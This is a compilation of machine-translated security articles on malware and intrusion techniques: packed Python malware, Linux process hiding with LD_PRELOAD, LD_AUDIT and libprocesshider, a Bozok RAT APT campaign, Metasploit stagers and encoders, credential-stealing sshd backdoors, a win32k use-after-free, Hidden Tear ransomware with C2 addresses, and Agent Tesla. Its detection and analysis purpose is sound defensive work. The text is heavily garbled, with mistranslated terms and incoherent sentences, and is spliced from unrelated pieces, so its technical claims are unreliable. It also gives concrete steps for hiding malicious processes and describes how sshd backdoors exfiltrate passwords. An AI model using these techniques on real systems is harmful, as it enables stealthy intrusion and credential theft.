Add 8 bytes before the head of the file, the first four bytes indicate the python version (not optional, must be the python2.7 version), the last four bytes indicate the timestamp (can be filled in casually).

A p u p y p y script is generated by decomcompiling the saved p y c file by uncompyle6.py, a pupy script.

A simple analysis of the script makes it very clear that this sample is of the pupy family.

Scripts are open-source, and specific behaviors are not analyzed.

Conclusion, through the analysis of multiple tools, we can see that through whatever tools are packaged, there is a key factor, which is python.A. dll or a libpython.so 。

So let's start with the python. firstWhat role does the dll play in the python.

In essence, in the entire directory structure of the Python, the python.The dll is the most core and basic component.

The runtime environment of the Python is in the python.Implemented in dll, which contains the object / type system, memory allocator, and runtime state information.

Here it is also possible to understand why any way to package requires the corresponding python.The dll had packed it in together.

That is, whatever tool, is through python.To dll to build the python running environment.

This procedure is possible by calling the python.The derived function of dll to implement the.

In the python.Among the export function of dll, the function Py_Initialize is the running environment to initialize Python.

There are two main running modes for Python, the interactive mode and the script running mode.

We demonstrate it with two simple examples: 1. How the scripts run We prepare a simple py script to compile it into a pyc file.

We prepare a simple C code to call this pyc file.

Load the corresponding version of the python.dll 。

First call the Py_Initialize function first.

The PyRun_SimpleFile, is then called to run the pyc file.

Output result 3. Example of a simple C code in an interactive mode: (1) Load the corresponding version of python.dll 。

First call the Py_Initialize function first.

Next you create a Dict. using PyDict_New

Then the PyEval_GetBuiltins is called to get the interpreter.

(5) Finally call PyRun_String to perform various code.

4. running results based on two demations, can clearly know the Python running logic.

When any executable packaged by Python is encountered later, it can be detected by the functions of the PyRun series.

With this series of functions, we can get the bytecode of the plaintext Python script or pyc packaged into the executable.

5. summarizes the process of processing python packaging in this series of samples as follows: (1) Determine whether it is a known tool package.

(2) If you are not known tools, start to find calls for the PyRun series.

(3) The corresponding sample code can be obtained in the parameters of the functions of the PyRun series.

(4), Use the uncompile.The py script decompiles the original py file.

In order to achieve persistent control, it tends to create hidden malicious processes, which makes it difficult for emergency responders to collect evidence. The hidden process method is divided into two categories, one is user state hidden, and the other is kernel state hidden.

There are many methods often used by user states, such as hijacking a preloaded dynamic link library, generally by setting the environment variable LD_PRELOAD or / etc/ld.so.preload, filter / proc/pid directory, modify process PID, and more.

Kernel state hidden process is generally loading malicious kernel module implementation process hidden. This paper introduces the hidden means and detection methods of the Linux operating system process encountered in the emergency response scene.

Hiack preload dynamic link library LD_PRELOAD view the process running on Linux operating system and generally use system command ps, top etc commands like ps usually read files in the / proc/ directory.

The / p r o c directory on the Linux operating system stores a series of special files of the current kernel running state, through which users can view information about the operating system hardware and currently running proc esses, or even change the running state of the kernel by changing some of these files.

The / proc directory contains many subdirectories named after numbers that represent the process number (pid) that the operating system is currently running processes, and each digital folder contains multiple information files for the corresponding process.

LD_PRELOAD is an environmental variable of the Linux operating system that allows the definition of dynamic link libraries that are preferentially loaded before the program runs, with effect immediately after the settings are complete.

The process of hijacking preloaded dynamic link libraries is often hidden by filtering the results of commands such as ps taken from / proc/ rather than targeting the / proc/ filesystem generation itself.

In an emergency response, you can generally debug all the system calls of the ps command and all the signal volumes received by this process.

When the system is not set up the ld.so.The preload,ps command reads the / etc/ld.so.The preload, returns a value of-1, indicating that the file does not exist.

When the system is set up with the ld.so.The preload,ps command reads the / etc/ld.so.The preload, returns a value of 0, indicating that the file exists.

For example, we want to hide the process threat.The py, you can help with the libprocesshider project, by modifying the static const char* processtofilter = " threat.The py ", hides the specified process.

Compcompiled after compiled.The so file path is used to write to / etc/ld.so.preload 。

After running the process, you can see no hidden process detected by the ps command.

But using busybox you can see relevant information about the hidden process that s because the busybox ps command directly reads the numbers of the proc directory and does not call the system preload library.

The script used for the test was called processhider.c, hijacking preloaded dynamic link library LD_AUDIT above describes the hijacking LDPRELOAD hidden process, hackers often use this technology to intercept the system call to execute malicious code.

As the documentation ld.Content in so, LDPRELOAD loads before all other objects (attached, user specified, ELF shared objects), but actually LDPRELOAD is not really loaded first and can achieve priority over LD_PRELOAD loading by taking advantage of LDAUDIT environment variables.

First, we verified the loading order of the next LDPRELOAD, LDAUDIT.

Compile the preloadlib.c、auditlib.c 。

From the results of performing the whoami you can see that the LDAUDIT takes precedence over the LDPRELOAD.

Also take the libprocesshider project as an example where we want to hide the running script threat.And py, if compiled directly using LD_AUDIT to load so files, it can be found that there is no hidden process.

So its available in libprocesshider.The c adds the following code: When recompiled, you can see that the process is hidden.

Users can get the maximum value of the current OS p i d by viewing the / proc/sys/kernel/pid_max file, for example centos7 can have 131,072 pid by default.

After the current process is created, get its pid registration under the proc directory, and then traverse through the tasklist with its pid as the main key to display the proc directory.

It know from above that there are up to 131072 p i d numbers under centos7.

Therefore, we modify the process pid through the kernel module, and then the user space cannot read the data outside the kernel configuration due to the limitation of permissions.

The code is as follows: execute a malicious process, get its process pid of 2895, after running the script you can see that the process has been hidden.

The stap is stored under path / usr/share/systemtap/examples/ by default.

For example, scripts in the network directory mainly view the network transmissio n of each process in the system, and scripts in the i o directory mainly view the process read and write to the disk.

Although processes are hidden, network connections still exist.

Therefore, you can obtain hidden processes from detecting the network connection of the current operating system at the kernel level through the script of the network directory.

Under Linux a kill returns "No such process",kill An existing process returns null so the hidden process pid is also obtained by signal.

Fake kernel module hidden processes on Linux and there are many kernel processes created to help complete system tasks.

These processes can be used for scheduling, disk I / O, etc.

When displaying currently running processes using commands like ps, the kernel processes are surrounded by [brackets], and ordinary processes usually do not show processes with square brackets.

Linux malware uses various techniques to hide detection.

One simulates the kernel thread by having the process name display [].

(1) / proc/maps is commonly used to see how the virtual address space of a process is used.

The normal kernel process maps content is empty and the masquerading kernel process is content identified.

The following pid of 2120 is a normal kernel process of the system, and a pid of 3195 is a fake kernel process.

(2) / proc/exe points to the binary link of the running process, the normal kernel process has no corresponding binary file, and the malicious kernel process has the corresponding binary file.

To sum up, the essence of safety is confrontation. Only by getting familiar with the commonly used attacks of black and gray production, can we not panic.

There are far more ways to hide the process under Linux. The author just introduced some situations encountered in the emergency response scene, want to know more, and listen to the next time decomposition.

The organization mainly conducts cyber espionage activities against China, Pakistan and other Asian countries, mainly stealing sensitive information.

The related attack activity dates back to November 2009.

In the attacks against China, the organization mainly attacked government institutions and scientific research and education, mainly in scientific research and education.

White Elephant was first exposed by Norman Security in 2013, followed by other security vendors continuing to track and disclose the latest activities, but the group has not stopped attacking the targets, but has been more active since 2015.

The Microstep Intelligence Agency recently captured a suspected white elephant APT attack through a threat hunting system, using the epidemic topic against Pakistan, and analyzed the following findings: -This attack delivered harpoon mail with COVID-19 hotspots.

Finally, the commercial Bozok remote control Trojan (version number: 1.4.1) was loaded through the no-file loading technology to monitor the theft behavior.

Bozok RAT is a lightweight but feature-rich remote-controlled Trojan, with clients supporting multiple regional languages.

The Trojan has historically been used by multiple APT organizations in targeted attack activities on financial, government direction.

It is worth noting that the Bozok Trojan was the first disclosed B o z o k Trojan Horse.

-The malicious PE module released during the attack carries the digital signature certificate from Accelerate Technologies Ltd and PE describes information as the software kill component program of Indian security company Quick Heal.

Expanding line association based on this certificate connects you to attack components of multiple white image APT organizations.

It is speculated that the certificate is a unique asset of the White Elephant Organization.

-Microstep Online extracts the relevant I O C by tracing analysis of relevant samples, IP, and domain names, which can be used for threat intelligence detection.

The detection of the attack and gangs has been supported by Microstep Online Threat Detection Platform (TDP), Threat Intelligence Management Platform (TIP), Threat Intelligence Cloud API, and Security DNS (OneDNS).

Details In early July 2020, the Microstep Intelligence Agency monitored a targeted attack on the COVID-19 hotspot.

The attack load is called " Covid19_Guidelines.docx ", document title" Guidelines for Government Employees and Organizations in the wake of COVID-19 epidemic" translated as: Guidelines for COVID-19.

According to the analysis of the bait documents, the attack target is Pakistan related industry practitioners, and the specific attack time is speculated to be in mid-June 2020.

The decoy document performs subsequent attacks using a malicious VBA macro.

Finally, load the Bozok remote control Trojan through memory to achieve the remote control of the target personnel PC host, to reach the purpose of intelligence theft attack.

Attack bait is shown below.

Sample information for sample analysis is described as follows.

Original attack load, malicious macro document releases malicious components as follows.

Data were spliced and decoded to release the bait documentation and the downloader PE.

The PE file is described as a Quick Heal company kill component and has a legal digital signature of Accelerate Technologies Ltd.

Its compilation environment is compiled for GCC P E files across Windows platforms.

Suspicious resource information is visible.

The resource data is actually the encrypted binary data for the Bozok Remote Control Trojan.

The module will go through the process and detect the soft before performing malicious functions, Detection targets include eset, avg, bitdefender, trendmicro, norton, AvkTray, small red umbrella, Kaspersky, Avast, quick heal, panda cloud antivirus, escan, Total Defense, Microsoft Windows Defender Antispyware, Check Point, F-Secure, k7tsecurity, McAfee.

If the ESET killing process is detected, each user space module IAT HOOK operates. The current analysis environment fails the hook, but it does not affect the subsequent process.

Decrypt the rozok Trojan from the resource segment, create your own puppet process, and then inject the execution.

Move yourself to the Windows directory, and then create the corresponding lnk file in the user self-start directory.

Dump injection module, the analysis shows that it is a Bozok remote control Trojan.

The module carries a forged Microsoft digital signature.

C & C address, mutex names, subsequent plug-in names are stored in the resource segment.

The current Bozok Trojan version number is 1.4.1.

For the first run, the MicroScMgmt. is set up by detecting the global flagThe e x e moves to the windows directory, named server.The e x e starts running, and then exits the current process.

The remote control module RAT is distributed as follows.

Implementation functions include: remote shell execution, file operation, process monitoring, registry monitoring, mouse and keyboard monitoring, download execution, etc.

Refer to the attachment for the specific instruction function.

The Bozok Trojan uses TCP protocol communication, and no other plug-in issuance behavior was found during the analysis process.

The Trojan horse online package is as follows.

Association analysis Through the bait document content in the attack event, you can basically determine that the target of the attack is the relevant units in Pakistan.

The purpose of the attack is to conduct intelligence collection on the target personnel PC host.

Based on geopolitics and the current APT cyber war situation, it can be speculated that the organization behind the attack is most likely to be the APT organization from India.

The 1, sample code fingerprint association.

From the perspective of sample fingerprints, the fingerprints carried in this attack are relatively messy, and of course, there are also many string fingerprints that are highly similar to the Indian white elephant APT organization.

As in the VBA code extracted in the original load, regarding the malicious module release name (microscmgmt.exe、 MSVCR71.dll、 jli.The dll) This part is exactly consistent with the Bad News Trojan component name used by the White Elephant APT organization's 2016 targeted attacks against China.

The Trojan used in this attack is the Dropper module of the Bozok Trojan, and its overall function is different from the white elephant organization historical attack plugin.

However, there are still some similarities in network connectivity tests (common sites such as google, facebook, twitter) and string encryption processing (simple addition or subtraction or operation of the module name, API name).

The 2, releases the PE digital signature certificate association.

The MicroScMgmt. was extractedThe e x e module signature certificate is as follows.

Sample association through the certificate expands the following files.

The URL content stored through its plaintext is directly linked to the targeted elephant attacks against the Pakistan military in September 2019 (India makes Kashmir Dangerous Place in the World.The BadNews Trojan horse in the xlsm).

The C & C of the backdoor module still uses plain text storage.

Several samples associated with the certificate can be associated to the White Elephant APT organization, basically confirming that the certificate is a unique asset and has been frequently used in targeted attack activities.

Appendix Bozok RAT Bozok 1.4.1 RAT core instruction function is described as follows.

In today's penetration attacks and testing, it has become increasingly difficult for individuals to complete a complete set of penetration attacks chains, so batches of vertical penetration tools emerge, used not only by testers, but also by hackers.

Therefore, it is very necessary to understand its implementation principle and characteristics.

Metasploit is the leader of post-penetration tools.

Speaking of the word Metasploit, most ordinary people may not know it, but for people with penetration tests, it is like land to leopards, water to fish, heaven to eagles, is one of the most useful audit tools that security professionals provide free, similarly, hackers can't love it.

Metasploit is a penetration test open source software, and also a mature vulnerability research and penetration test code development platform.

Structural Metasploit design adopts the modular concept as much as possible.

Basically consists of library files, plug-ins, interfaces, functional programs, modules, etc.

Figure 1 The Metasploit V4 structure module is the code for the core penetration test function loaded, integrated and externally provided by the Metasploit framework.

It is divided into auxiliary modules (Auxiliary), Permotic Attack Module (Exploits), Post-osmotic Attack Module (Post), Attack Load Module (payloads), Encoder Module (Encoders), Empty Command module (Nops), and V5 new kill modules (Evasion).

The following is the function introduction of the module: auxiliary module: by scanning the network service, collecting the landing password or Fuzz test discovery loopholes to obtain the rich intelligence information of the target system, so as to launch accurate attacks.

Penetration attack module: including attacking the target with the discovered security vulnerabilities, executing the active attack load, and making the user on the target automatically trigger the passive attack load by using the fake office document or browser.

Empty instruction module: follow the empty operation with any material effect or irrelevant operation command after the successful penetration attack module to ensure the smooth execution of the subsequent attack load.

The common operating code on the x86 CPU architecture platform is 0x90.

Attack load module: follow the effective insertion code running in the target system after the penetration attack module. The goal is to establish a connection and get the target shell.

Encoder module: Similar to the empty instruction module, we ensure that it can not be restricted by the vulnerability parameters or the target system type.

Rear penetration attack module: After obtaining the target shell, conduct a post-penetration attack, such as obtaining information, springboard or even Intranet penetration.

Free module: As a new V5 version, only for V types.

Kill mode is relatively simple, apply for memory, copy attack load, execute attack load.

Figure 2 As can be seen from its function, in addition to the vulnerability code, the core of its construction of the attack load lies in the attack load module and the coding area module.

The following features will be highlighted.

(1) Attack Load Module The function of the attack load module is to generate different basic payload. s according to the requirements of different platforms, different communication modes and different execution modes

3 Metasploit partial type attack load module is divided into independent (Single), transmitter (Stager), the former (Stage), the latter two are co-execution mode.

single: independent load, can be directly implanted into the target system and execute the corresponding program stager: transmitter load for establishing a stable network connection between the target machine and the attack machine, with the transmission load.

Usually the load volume is very small and can be easily injected after vulnerability exploitation.

The stage: transmitter loads, such as shell, meterpreter et al.

After a stable connection is established, the attack machine transmits the s t a g e to the target machine, processed by the stagers, and transfers control to the stage.

For example, get the shell, or meterpreter control program of the target machine running.

In fact, Single is a collection of Stage and Stager, and the following will focus on how Stage and Stager are done.

Stage + Stager applications in environments with limited attack load size and operating conditions, such as small available space for vulnerability filling buffer, new operating systems such as Windows 7 introduced NX (stack unimplemented), DEP (data execution protection) and other security defense mechanisms, just like a rocket satellite, phased implantation to achieve the purpose, similar to the web invasion.

Use cld to clear the flag bit, avoid interference from previous nop instructions or vulnerability exploit code, and then jump to the remote connection behavior.

The method to obtain function address under Windows system is PEB addressing principle and Linux. Windows is explained here.

As shown in the following figure, the f s register in the NT kernel system points to the TEB structure, TEB structure at T E B + 0x30, PEB + 0 x 0 c to the PEB_LDR_DATA structure, which contains the dll chain table called by the program, passes through the chain table, passes the function name of the dll export table, calculate the Hash, and compare the Hash of incoming H a s h.

In addition, according to the author, Cobalt Strike, addresses the same way as Metasploit, so the function Hash is the same, and based on its compatibility problems, these functions Hash will not change in a short time.

Function call order Yara rules can be combined according to the characteristics of the stager by knowing the flag bits as well as the generated Hash values of the function names.

Traffic and generated virus files meet this feature, the following are partial yara rules: stager section yara rules static extraction information to extract the specified information based on a specified location, including IP and port.

The transfer load (Stage) principle sends the second Stage, essentially a dll.

As mentioned above, Stager has copied the Stage in memory and jumps to the first address of the memory, and then performs from the head of the dll and runs this dll.

Anyone who knows the principle of the program operation knows that the program operation requires a loader loader that parses the program structure before the CPU performs the code.

However this transfer is in memory and there is no loader so how do dll run?That is, the ReflectiveLoader reflection injection.

In principle, the assembly simply calls the ReflectiveLoader reflection function first through the previous assembly, which simulates the loader that parses its own structure, and then jumps to the DllMain for normal execution.

However, due to the various limitations of PE files, the characteristics of this file injection mode is more obvious.

The p c a p package capturing the plaintext propagation stager: Figure 14 stage Traffic Capture Yara rule calls ReflectiveLoader, and the called function Hash as feature recognition from the first part of its file.

You can use the Msfconsole all-in-one centralized console directly; Figure 16 msfconsole generation stager can also be generated directly using the msfvenom tool.

The corresponding IP and Port. can be resolved directly by using the corresponding script

The pcap of the capture is also very obvious: the regular flow packet in the return packet in Figure 20 is similar to Metasploit. According to the author's analysis, the stager. in the return packet is Cobalt Strike

If the traffic detection is conducted at this time, the accurate interception can be conducted.

The characteristics of stager and stage mentioned above in the encoder module are very obvious, the antivirus software is very easily detected, and the generated payload may not be used properly due to various limitations of the penetration targets.

So Metasploit integrates many coding types (Encode) to meet different requirements.

Encode Type 1) Advantages: payload generated with coding has no bad characters and slightly free.

2) principle: based on the different way, but the way is different, and many coding formats can achieve any multiple coding or multiple coding formats mixed coding. However, based on the principle of its implementation, each coding format must have the corresponding characteristics.

These features are the key to identifying the resolution.

3) structure: heterogeneity or cycle structure + different or data Figure 22 a layer of heterogeneity or structure how does this heterogeneity or cycle is realized?According to the three elements: different value (key), length (length) and data address (addr): 1) first to find the data start address, the simplest is the assembly (call $ + 5), plus the calculated offset to obtain the data start address; 2) the second data length of the last; 3) the hetero key, can be a fixed way or a non-fixed way related to the previous key or disclosure content.

The following will take the example of x86/shikata_ga_nai encoding, which is the most practical and commonly used in Metasploit.

x86/shikata_ga_nai uses-e x86/shikata_ga_nai selection encoding format for x86/shikata_ga_nai, using-i 2 to select encoding for 2 times, generating post-encoding payload.

The decryption of arbitrary encoding times and hybrid encoding methods is now supported.

In the emergency response process of many Linux platforms, Found a sshd backdoor in many systems, Although the sshd backdoor has been around for over 10 years, But there is no public information on how to analyze it, So most security people cannot find the sshd back doors, Even less clear how to analyze it, This leads to the long existence of the sshd backdoor in the system, The common function of sshd backdoor is to record all account passwords of the host, And adding a universal password, Others will transfer the account password to the attacker to get the server, An attacker can use the back door or enter the system directly with the obtained password, encounter little resistance, Long-term infringement of the target system, belongs to Linux APT attack technology.

The sshd universal password backdoor implementation principle The sshd program is one of the executables of the openssh-server software package, belongs to the service side program, open 22 ports by default, providing external ssh service.

Since openssh-server is an open source program, anyone can change its source code, recompile, and provides technical possibility for the attacker to implant malicious code blocks, in addition to the sshd program will be tampered with by the attacker, the s s h commands in the openssh-client software package are often tampered with by the attacker to steal information such as the account passwords of the target machine connected to other external machines.

Universal Password authentication function The following is a backdoor code for a openssh-5.9p1 in the network, in the password authentication file auth-passwd.A judgment c ondition is added to the auth_password function in c. If the password is equal to the SECRETPW(can be configured itself), the return secret_ok=1 indicates the successful password authentication, without the next password judgment process, which is equivalent to adding a universal password.

Login account password recording function example in and above the same file auth-passwd.The auth_password function in c adds the following code that refers to adding the username password to a custom ILOG file in a specific format if the system password authentication is successful.

The sshd universal password backdoor quick detection method The sshd universal password backdoor check method has two main methods, Static detection and dynamic detection, Static detection contains the integrity verification of the sshd program, And the feature detection of the executable files, You can use the yara rules to collect the features of the known sshd backdoor programs, Then scan the sshd executable in the system, Reverse analysis of the tampered sshd programs, Dynamic detection is relatively troublesome, And need some Linux system call related knowledge, For sshd encryption shell can not be directly reverse analysis.

The sshd program integrity check uses the rpm program brought in the system, or the dpkg program checks the sshd program installed with the software package in the system, comparing md5 at initialization installation to the current md5, tampering the file if altered.

Click to enter the interface to see the universal password and password storage path in.Location near the rhosts.

Sometimes the malicious program is not as simple as the above situation, and the universal password and account-related characters cannot be found directly. At this time, we need to use the ida F5 function to check the pseudo code at the password verification place of the sshd application.

The following is the encrypted sshd back door universal password: 3.2 account password network return type sshd back door in addition to directly record the account password in the local, can also directly transfer the account password to the attacker, the Internet is more conducive to the attacker, can bypass the restrictions of the network directly get the internal account password, below is a m a i l command in the Linux system to transfer, will be to the stolen login account password sent to the attacker's mail box.

When the sshd program is encrypted, shell, confused and other operations, the account password-related characteristics will be recorded for the sshd backdoor, and the s s h d can be dynamically debug and analyzed in Linux.

strace is a Linux user space tracker available for diagnosing, debugging, and teaching to monitor the interaction of user space processes and kernels, such as system calls, signalling, process state changes, etc.

The system can use the strace command to use the sshd process file related system research, and write write system calls for track, use one machine to track the sshd service process, another machine for ssh login operation, monitor the sshd open files and write operation in the tracking page.

Track the sshd process writes the account password to a custom file

The following is the y a r a detection rules written by the sshd backdoor: related hacker gang in the previous hacker attack activities, found that part of the APT and black production gang, APT attack gang main representative for Oldfox old fox, XJ gang, black production gang including TeamT-N-T mining gang, pm miner mining gang, etc.

The following only these four example analysis: 1. sshd back door and Oldfox gang Oldfox old fox APT attack gang, is micro step found and named domestic old black gangs, mainly attack news media site, technology industry, app download site, financial sites, etc., will also directly steal money attack, in Linux platform often use sshd back door intranet penetration, long latent time, high Intranet penetration rate.

Oldfox's s s h d backdoor contains universal password functions, as well as recording account passwords to specific file paths, relatively random, consisting of numbers and letters, all in lowercase.

The following is a sample of the s s h d backdoor used by the Oldfox gang, obtained during the emergency response investigation: The sshd backdoor and s s h backdoor are made in the Oldfox Old Fox gang toolkit. The password and log location of each rear door are different, and the compiled backdoor version is also different.

Black Gambling XJ gang is a domestic gambling black production gang that went public in 2019, Since the attacker's C & C often uses the string "xj", We named it the XJ Gang, Presumably an early gambling black production star gang competitor, Because the characters in C & C are often xjdsb, XJ gangs mainly penetrate the target sites through Web vulnerabilities, server vulnerabilities, and weak password blasting, And make good use of the rebound shell backdoor, Xnote, sshd back door, Trojan tools such as webshell enable remote control, long-term residency, and information theft.

XJ gangs will implant gambling information on legal websites by tampering with website pages, profiles and databases to promote all kinds of gambling sites.

Here are the s s h d backdoor used by the gambling black XJ gang, with the universal password function and sending the stolen account password to the X J gang's remote server using the curl command in the system.

The TeamT-N-T mining ring, known as the TeamT-N-T mining ring because of the teamt-n-t-related keywords in the mining configuration mailbox, is also known as the ash miner mining ring by some researchers, because the initialized script name of the mining Trojan horse contains the ash keyword.

The gang has been active for many years and often uses various rce vulnerabilities for Linux platform mining and Windows platform mining. In addition to mining, attackers also find valuable targets for manual penetration operations. According to the Trojan we use, attackers will raise rights, install sshd backdoor, install Linux kernel module, install Windows and other drivers to facilitate persistent attacks.

Here are the s s h d backdoors used by ash miner mining gangs, in which sshd.The sh is the scripting program that automates installing the sshd backdoor.

pm miner mining ring, because the name of the attacker Trojan installation script has been pm.So sh, I call it pm miner mining gang, the mining gang is still active, often use redis empty password and other r c e ways to spread, the attacker will also select the target for further Intranet penetration attack, use automated scripts for sshd backdoor steal account password, trace clearance, and back data operations, the attacker will be based to the data screening target further attack, so as to expand the attack results.

Tokit files used by pm miner gang attacks containing automated installation sshd backdoor scripts, clear login log scripts, recompiled rm files, ss files, ssh trojans, sshd backdoor, etc.

Below is the s s h d backdoor program used by the pm miner mining gang. The key reverse code: due to space restrictions, only the sshd backdoor of the attack gang is listed, and many sshd backdoor is not classified to the specific attack gang. Interested students can conduct hunt and analysis themselves.

Summary sshd back door detection is also a process against the attacker, only understand the attacker's behavior mode, the actual process of detection can better find the attacker's attack, in addition to the universal password back door, you can also use the specified port is not secret login back door, and through the network will steal the account password directly transmitted to the attacker's service back door.

At present, this detection method is suitable for detecting the universal password backdoor of some existing openssh-server, and testing multiple public sshd backdoor are applicable. For other types of sshd Trojan backdoor, some adjustments to the specific analysis method are required, but the overall analysis process is the same.

The most important point when studying the u a f vulnerability in the win32k module is to understand the state conversion process of the entire lifecycle of the target object, in particular which behaviors trigger an increase in ref, which behaviors lead to decreased ref and even some scenarios leave the kernel out considering the ref value directly free target object.

This paper aims to explore the uaf vulnerability caused by such a scenario: the kernel does not properly handle the ownership problem of gdi objects, so that the gdi objects are still free in the quoted state, resulting in uaf (the target system for this analysis debugging is win7x86).

The parameters of the Multi User Gre Cleanup Hmg Own Remove All Locks function represent the corresponding g d i object type, such as 5 corresponds to the bitmap object and 4 corresponds to the regions object.

Let's take a look further at what the Multi User Gre Cleanup Hmg Own Remove All Locks function does: you can see the system traverse the handle table of gdi objects and actively zero their gdi counts for g d i objects belonging to the current process.

Then we can abstract out such a vulnerability model, there is gdi object A, first through some operations, other objects in the system maintain a reference to gdi object A, and then the key point is to try to make the owner property of object A to OBJECT_OWNER_CURRENT subordinate to the process P1.

When the P1 process exits, object A is released and the reference to object A is still held in the kernel, creating a typical uaf scenario.

Vulnerabilities such as CVE-2015-1722, CVE-2015-1724 CVE-2015-6173, CVE-2016-0094, CVE-2019-0803 are basically instantiations of this abstract scenario, and later on, we will analyze this scenario with CVE-2015-1722 as an example.

The CVE-2015-1722 analysis is as follows as the P O C of CVE-2015-1722.hbmp1 in POC is the key gdi object A in the previous vulnerability model.


However, the d c object corresponding to hdc2 still maintains a reference to the hbmp1, which is a typical uaf scenario.

Think carefully about the vulnerability model we originally refined, there are two key factors: (1) the system did not consider the reference of the gdi object when modifying its owner; (2) calling NtGdiCloseProcess to clean the g d i object when the win32 process exits is too rough to consider the u a f problem due to (1).

Then after the attacker finds the new setowner method, The patch is invalid, Until the p a t h of CVE-2019-0803 appeared, The vulnerability model scenario for the bitmap object was fully verified, The entire patch is divided into two parts, The setowner section adds the verification for the reference count: when the reference count is not 0, A special marker bit was 0x4000, added Another part is at NtGdiCloseProcess: For objects with a 0x4000 flag bit, Special treatment was done.

Recently, the microstep intelligence bureau in the analysis of a malicious sample, the sample of the C2 address association analysis found that the address also received the ransomware return, through the format of the return of information association, found that the use of a ransomware called "Hidden Tear".

A malicious sample will download a subsequent script file execution from the domain xyz.

Association analysis of the domain name xyz found that the domain name had a callback request in a representation format, and the analysis of the callback information found that it was the first open-source ransomware for Windows, called "Hidden Tear".

In the past year, there have been multiple attacks on using the ransomware to use the COVID-19 topic to attack victims.

The ransomware "Hidden Tear" uses AES encryption, generates AES keys locally, and transmits the keys and host information back to the C2 address in a fixed format.

Details have recently captured one.LNK format of malware, during the analysis process found that the Trojan will later call Powershell to continue from the domain name dllhost.The xyz download is subsequent.The js file, while...The js file will try to reach another domain name, dlldns.The xyz initiates the request for the next step.

About Domain Name Intelligence in X Community X Hidden Tears is the first open source ransomware for Microsoft Windows, first uploaded to GitHub, by Turkish security researcher Utku Sen in 2015 has been deleted, but has been fork 490 times before the deletion, and the original code can still be found in other users' warehouses.

The Hidden Tear page association found that in the past year, several attacks on victims using modified versions of the ransomware, for example, in March, attackers sent phishing emails to health organizations and universities involved in COVID-19 research, including ransomware.

In May, an attacker registered to copy the official domain name, sent bait files for the COVID-19 epidemic charts to Italy, and encrypted the victim hosts to extort Bitcoins."Hidden Tear" ransomware uses AES encryption to obtain the user's host information and generates the key, and sends the user's information in a fixed format to the address along with the C2 key.

It is worth noting, however, that the step of generating the key is generated locally and no encryption was sent to the C2 address, meaning that the key can be directly found in the traffic data to decrypt the file.

In March 2020, the attacker used a fake email delivery address, noreply@who.int(176.223.133.91) sent e-mails to Canadian health organizations and universities participating in the COVID-19 study containing an R T F file named "20200323-sitrep-63-covid-19.doc".

In May 2020, the Hidden Tear-based variant ransomware, FuckUnicorn, used COVID-19 to attack Italy by registering "the" Federation of Italian Pharmacists " (fofi.The counterfeit domain name of i t) (fofl.To it) to do malware distribution.

Once the victim will be.When the rtf is opened, the documentation tries to exploit the CVE-2012-0158 vulnerability to release the ransomware to the C:\\Users\\User\\AppData\\Local\\svchost.And exe and execute, releases the svchost.The e x e has hidden properties, with an Adobe Acrobat icon.

After the sample is executed, you will try to get a tempinfo. from the address96[.] lt/wras/RANSOM20.jpg requests a picture showing the blackmail notification and save the picture to C:\\Users\\User\\ransom20.jpg, and then set the picture to desktop wallpaper.Figure 9. After downloading the blackmail information page, you will check whether the H T T P status code with the C2 address is 100 Continue, to the address www.tempinfo.96.lt/wras/createkeys.The php sends a POST request, sending the host such as the computer name, the user name and other related information.

In the original Hidden Tear, the POST request page is / write.php?info=。

After the traffic packet sends the information, the AES symmetric key is generated locally through the obtained host information, sending the key to the C2 address, and the host information is sent together with the A E S key to the C 2 address through the POST request.

The encryption algorithm is also relatively simple, with the encryption suffix of.locked20 。

Encryption algorithm 2. exe via the phishing site fofl.Issue of it.

Basic information: The File NameFile sample is an exe file with an icon with a novel coronavirus, and the file in the property is called "FuckUnicorn".

The file properties page, after the sample is run, displays a fake COVID-19 outbreak infographic from the Center for Systems Science and Engineering at Johns Hopkins University.

Bay files, COVID-19 Epidemic chart. When the user reads the chart, the sample starts to encrypt the user's files, and the encrypted folders include the host's / Desktop,/Links,/Contacts,/Documents,/Downloads,/Pictures,/Music,/OneDrive,/Saved Games,/Favorites,/Searches,/Videos.

In addition to the two types of samples mentioned in the article, there are more variant versions of Hidden Tears, and there have been external attacks.

Nevertheless, it is that the samples use AES symmetric encryption and keys are generated locally and without encrypted transmission, meaning that the encrypted files can be decrypted directly.

While the site claims the product is only a legal service to users, its features such as bypass killing, secret bundling and sensitive file transfer are no less impressive or more sophisticated than the stealing Trojan, making people tend to consider it a kind of software specifically used to steal.

Later, Agent Tesla gradually began to popular in underground forums and hacker communities, generally ranging from $15 to $69, often trading through Bitcoin.

Now, with many code improvements and enhanced capabilities, Agent Tesla has become a professional secret theft software that can steal various sensitive information like browsers, FTP, VPN, mailboxes, and WIFI.

In terms of transmission, Agent Tesla spreads mainly through phishing or spam carrying multiple format attachments (such as ZIP, CAB, MSI, IMG and Office files, etc.), and supports data return from multiple protocols such as smtp, ftp, http.

In terms of analysis and confrontation, Agent Tesla uses a variety of means for anti-killing, anti-debugging and anti-virtual machines, which greatly increases the difficulty of security personnel to analyze it.

At the user level, Agent Tesla provides easy to configure pages, users to easily choose the required Trojan functions according to their own situation, such as various ways to achieve persistence, UAC settings, forced closure of anti-antivirus software process.

In attacking target industry options, Agent Tesla's attacks spread to the Internet, education, banking, telecommunications, medicine and manufacturing, expanding to attacks on the energy industry in early 2020.

Today, the Agent Tesla is still active.

For example, in early 2020, several hacker organizations were revealed to use Agent Tesla to conduct phishing activities on governments and medical organizations with COVID-19 themes.

Among them, Deloitte CTI observed a phishing attack in the name of "COVID-19" ".

In phishing attacks, hackers use the Agent Tesla Trojan to conduct IP information theft against medical research institutions located in Japan and Canada.

According to the analysis of Deloitte CTI researchers, hackers send phishing emails called "COVID-19" supplier notification "or" epidemic consultation " during the attack.

These phishing emails contained a copy disguised as a " COVID-19 vendor notice.The zip " Trojan file, on which once the user clicks, the Agent Tesla Trojan is automatically loaded onto the victim's computer to steal current medical research.

Another example, in mid-2020, Gorgon APT used Agent Tesla for India's MSME industry to steal secrets.

The researchers observed phishing activities targeting MSME businesses within India, with malicious documentation themed on COVID-19.

The attack process is: The victim opens the "face mask order."After the doc ", the RTF triggers the CVE-2017-11882 vulnerability to execute arbitrary code.

There are two malicious o l e objects in the RTF file or objects, the first is the executable called ServerCrypted.The vbs script; the second one is the Equation.3 exploit (CVE-2017-11882) and run ServerCrypted.Scriscript of vbs.

After successful utilization, the script will download two extensions called.The jpg file, one of which is a PowerShell script, loads the DLL in memory; the second file is a Agent Tesla payload.

